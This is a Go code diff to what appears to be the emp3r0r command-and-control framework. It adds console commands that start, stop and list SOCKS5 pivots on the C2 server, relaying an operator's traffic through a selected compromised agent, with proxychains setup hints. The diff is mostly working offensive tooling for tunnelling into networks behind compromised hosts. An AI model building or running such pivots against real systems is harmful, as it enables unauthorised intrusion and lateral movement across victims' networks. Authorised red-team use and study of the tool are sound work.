@@ -12,6 +12,7 @@ import (
 	"github.com/jm33-m0/emp3r0r/core/internal/cc/api/client"
 	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/agents"
 	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/ftp"
+	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/wireguard"
 	"github.com/jm33-m0/emp3r0r/core/internal/cc/builder"
 	c2context "github.com/jm33-m0/emp3r0r/core/internal/cc/context"
 	"github.com/jm33-m0/emp3r0r/core/internal/cc/controllers"
@@ -435,8 +436,111 @@ func Emp3r0rCommands(app *console.Console) console.Commands {
 		rootCmd.AddCommand(forgetAgentCmd)
 		carapace.Gen(forgetAgentCmd).PositionalCompletion(carapace.ActionCallback(listAgents))
 
+		socksStartCmd := &cobra.Command{
+			Use:     "socks_start [port]",
+			GroupID: "c2",
+			Short:   "Start a SOCKS5 pivot on the C2, relaying through the selected agent",
+			Example: "socks_start 1080\n\tproxychains: socks5 <C2 WireGuard IP> 1080",
+			Args:    cobra.MaximumNArgs(1),
+			Run:     socks5StartCmdRun,
+		}
+		socksStartCmd.Flags().StringP("bind", "b", "", "C2 bind address (default: all interfaces, e.g. reachable via the WireGuard IP)")
+		rootCmd.AddCommand(socksStartCmd)
+
+		socksStopCmd := &cobra.Command{
+			Use:     "socks_stop <port>",
+			GroupID: "c2",
+			Short:   "Stop a SOCKS5 pivot on the C2",
+			Example: "socks_stop 1080",
+			Args:    cobra.ExactArgs(1),
+			Run:     socks5StopCmdRun,
+		}
+		rootCmd.AddCommand(socksStopCmd)
+
+		socksStatusCmd := &cobra.Command{
+			Use:     "socks_status",
+			GroupID: "c2",
+			Short:   "Show running SOCKS5 pivots on the C2",
+			Args:    cobra.NoArgs,
+			Run:     socks5StatusCmdRun,
+		}
+		rootCmd.AddCommand(socksStatusCmd)
+
 		return rootCmd
 	}
+}
+
+func socks5StartCmdRun(cmd *cobra.Command, args []string) {
+	port := 1080
+	if len(args) > 0 {
+		p, err := strconv.Atoi(args[0])
+		if err != nil || p <= 0 || p > 65535 {
+			logging.Errorf("Invalid port: %s", args[0])
+			return
+		}
+		port = p
+	}
+	bind, _ := cmd.Flags().GetString("bind")
+	agent := agents.MustGetActiveAgent()
+	if agent == nil {
+		logging.Errorf("No active agent selected (use `target <id>` first)")
+		return
+	}
+	if err := client.StartSocks5Proxy(agent.Tag, port, bind); err != nil {
+		logging.Errorf("socks_start: %v", err)
+		return
+	}
+	proxyAddr := socks5ProxyHost()
+	if bind != "" && bind != "0.0.0.0" {
+		proxyAddr = bind
+	}
+	logging.Successf("SOCKS5 pivot on %s:%d via agent %s", proxyAddr, port, agent.Tag)
+	logging.Warningf("proxychains config: socks5 %s %d", proxyAddr, port)
+}
+
+// socks5ProxyHost returns the address the operator should reach the C2-side
+// SOCKS5 listener at. It is auto-populated: when the console runs on the same
+// host as the C2 (local mode) it is 127.0.0.1; otherwise it is the WireGuard
+// server IP the operator connected through (set from --server-wg-ip), so proxy
+// traffic stays inside the WireGuard tunnel.
+func socks5ProxyHost() string {
+	if ServerIP == "" || ServerIP == "127.0.0.1" || ServerIP == "localhost" {
+		return "127.0.0.1"
+	}
+	return wireguard.WgServerIP
+}
+
+func socks5StopCmdRun(cmd *cobra.Command, args []string) {
+	port, err := strconv.Atoi(args[0])
+	if err != nil {
+		logging.Errorf("Invalid port: %s", args[0])
+		return
+	}
+	if err := client.StopSocks5Proxy(port); err != nil {
+		logging.Errorf("socks_stop: %v", err)
+		return
+	}
+	logging.Successf("SOCKS5 pivot on port %d stopped", port)
+}
+
+func socks5StatusCmdRun(cmd *cobra.Command, _ []string) {
+	proxies, err := client.ListSocks5Proxies()
+	if err != nil {
+		logging.Errorf("socks_status: %v", err)
+		return
+	}
+	if len(proxies) == 0 {
+		logging.Infof("No SOCKS5 pivot is running on the C2")
+		return
+	}
+	for _, p := range proxies {
+		bind := p.BindAddr
+		if bind == "" || bind == "0.0.0.0" {
+			bind = "0.0.0.0 (any interface)"
+		}
+		logging.Infof("SOCKS5 pivot on %s:%d via agent %s", bind, p.Port, p.AgentTag)
+	}
+	logging.Infof("Reach it at socks5 %s <port> (tun2socks picks it up automatically)", socks5ProxyHost())
 }
 
 func execCmd(cmd *cobra.Command, args []string) {
